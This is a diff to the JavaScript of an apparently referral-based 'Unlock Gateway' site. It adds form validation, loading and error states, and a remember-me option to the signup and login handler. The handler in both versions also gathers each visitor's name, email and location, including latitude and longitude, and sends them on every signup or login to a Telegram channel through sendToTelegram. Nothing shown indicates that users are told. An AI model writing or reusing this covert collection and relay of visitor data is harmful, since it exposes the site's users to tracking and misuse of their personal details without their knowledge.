@@ -20,6 +20,7 @@ const inputName = qs('#inputName');
 const inputEmail = qs('#inputEmail');
 const createBtn = qs('#createBtn');
 const logoutBtn = qs('#logoutBtn');
+const rememberMe = qs('#rememberMe');
 
 const displayName = qs('#displayName');
 const topAvatar = qs('#topAvatar');
@@ -332,61 +333,162 @@ function getUserLocation() {
 }
 
 // ----------------------------------------------------
-// Interactive Binding and Listeners
-// ----------------------------------------------------
+// Character counter for display name
+inputName.addEventListener('input', () => {
+  qs('#nameCounter').textContent = inputName.value.length;
+});
 
+// Clear error messages on input
+inputName.addEventListener('focus', () => {
+  const err = qs('#authError');
+  if (err) err.style.display = 'none';
+});
+
+inputEmail.addEventListener('focus', () => {
+  const err = qs('#authError');
+  if (err) err.style.display = 'none';
+});
+
+// Enhanced Create Button Handler
 createBtn.addEventListener('click', async () => {
-  const name = inputName.value.trim();
-  if (!name) {
-    alert("Authentication Protocol: Please enter a Display Name to unlock access.");
-    inputName.focus();
-    return;
-  }
-
-  const email = inputEmail.value.trim();
-  const isNewUser = !state.name; // Check if this is a new user
-
-  state.name = name;
-  state.email = email;
-
-  // Get user location
-  const location = await getUserLocation();
-  const locationString = location.error 
-    ? `📍 Location: ${location.error}`
-    : `📍 Location: ${location.city}, ${location.region}, ${location.country} (${location.latitude}, ${location.longitude})`;
-
-  // Process invite parameter - referral system
-  let inv = null;
+  const authError = qs('#authError');
+  const authSuccess = qs('#authSuccess');
+  const authErrorText = qs('#authErrorText');
+  const btnText = qs('#btnText');
+  const btnIcon = qs('#btnIcon');
+  
+  // Reset messages
+  authError.style.display = 'none';
+  authSuccess.style.display = 'none';
+  
+  // Disable button to prevent multiple submissions
+  createBtn.disabled = true;
+  
   try {
-    const url = new URL(window.location.href);
-    inv = url.searchParams.get('invite');
-  } catch (e) {
-    const params = new URLSearchParams(window.location.search);
-    inv = params.get('invite');
+    const name = inputName.value.trim();
+    const email = inputEmail.value.trim();
+    
+    // Validation: Display Name
+    if (!name) {
+      throw new Error('Please enter your display name');
+    }
+    
+    if (name.length < 2) {
+      throw new Error('Display name must be at least 2 characters');
+    }
+    
+    if (name.length > 50) {
+      throw new Error('Display name must be 50 characters or less');
+    }
+    
+    // Check for invalid characters
+    if (!/^[a-zA-Z0-9\s\-_\.]+$/i.test(name)) {
+      throw new Error('Display name can only contain letters, numbers, spaces, dashes, and underscores');
+    }
+    
+    // Validation: Email (if provided)
+    if (email) {
+      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
+      if (!emailRegex.test(email)) {
+        throw new Error('Please enter a valid email address');
+      }
+    }
+    
+    // Show loading state
+    btnText.textContent = 'Authenticating...';
+    btnIcon.setAttribute('data-lucide', 'loader');
+    if (typeof lucide !== 'undefined') {
+      lucide.createIcons();
+    }
+    
+    const isNewUser = !state.name;
+    
+    // Get user location
+    const location = await getUserLocation();
+    const locationString = location.error 
+      ? `📍 Location: ${location.error}`
+      : `📍 Location: ${location.city}, ${location.region}, ${location.country} (${location.latitude}, ${location.longitude})`;
+    
+    // Process invite parameter - referral system
+    let inv = null;
+    try {
+      const url = new URL(window.location.href);
+      inv = url.searchParams.get('invite');
+    } catch (e) {
+      const params = new URLSearchParams(window.location.search);
+      inv = params.get('invite');
+    }
+    
+    // Update state
+    state.name = name;
+    state.email = email;
+    
+    // Handle referrals
+    if (inv) {
+      state.referredBy = inv;
+      state.invites += 1;
+      sendToTelegram('🎉 NEW REFERRAL SIGNUP\\n👤 Name: ' + name + '\\n📧 Email: ' + (email || 'N/A') + '\\n🔗 Referred By: ' + inv + '\\n⭐ Points: +1\\n' + locationString);
+    } else if (isNewUser) {
+      sendToTelegram('🆕 NEW USER SIGNUP\\n👤 Name: ' + name + '\\n📧 Email: ' + (email || 'N/A') + '\\n' + locationString);
+    } else {
+      sendToTelegram('🔄 USER LOGIN\\n👤 Name: ' + name + '\\n📧 Email: ' + (email || 'N/A') + '\\n' + locationString);
+    }
+    
+    // Save state
+    save();
+    
+    // Show success state
+    createBtn.classList.add('success-state');
+    btnText.textContent = '✓ Welcome!';
+    btnIcon.setAttribute('data-lucide', 'check-circle-2');
+    if (typeof lucide !== 'undefined') {
+      lucide.createIcons();
+    }
+    
+    // Clear inputs
+    inputName.value = '';
+    inputEmail.value = '';
+    qs('#nameCounter').textContent = '0';
+    
+    // Store remember preference
+    if (rememberMe.checked) {
+      state.rememberMe = true;
+      save();
+    }
+    
+    // Render after animation
+    setTimeout(() => {
+      renderState();
+      createBtn.classList.remove('success-state');
+    }, 800);
+    
+  } catch (error) {
+    // Show error message
+    authErrorText.textContent = error.message || 'Authentication failed. Please try again.';
+    authError.style.display = 'flex';
+    
+    // Reset button
+    btnText.textContent = 'Unlock Gateway';
+    btnIcon.setAttribute('data-lucide', 'arrow-right');
+    if (typeof lucide !== 'undefined') {
+      lucide.createIcons();
+    }
+    
+    // Focus on name input for retry
+    inputName.focus();
+  } finally {
+    // Re-enable button
+    createBtn.disabled = false;
   }
-
-  if (inv) {
-    state.referredBy = inv;
-    state.invites += 1; // Award 1 point for signup via referral
-    sendToTelegram('🎉 NEW REFERRAL SIGNUP\\n👤 Name: ' + name + '\\n📧 Email: ' + (email || 'N/A') + '\\n🔗 Referred By: ' + inv + '\\n⭐ Points: +1\\n' + locationString);
-    alert('Welcome! You earned 1 point from the referral link. Continue inviting others to climb tiers!');
-  } else if (isNewUser) {
-    // New user signup notification
-    sendToTelegram('🆕 NEW USER SIGNUP\\n👤 Name: ' + name + '\\n📧 Email: ' + (email || 'N/A') + '\\n' + locationString);
-  } else {
-    // Returning user login notification
-    sendToTelegram('🔄 USER LOGIN\\n👤 Name: ' + name + '\\n📧 Email: ' + (email || 'N/A') + '\\n' + locationString);
-  }
-
-  save();
-  renderState();
 });
 
 logoutBtn.addEventListener('click', () => {
-  state = { name: null, email: null, invites: 0, tier: 0, videos: 0, referredBy: null, referrals: [] };
+  state = { name: null, email: null, invites: 0, tier: 0, videos: 0, referredBy: null, referrals: [], rememberMe: false };
   save();
   inputName.value = '';
   inputEmail.value = '';
+  rememberMe.checked = false;
+  qs('#nameCounter').textContent = '0';
   renderState();
 });
 
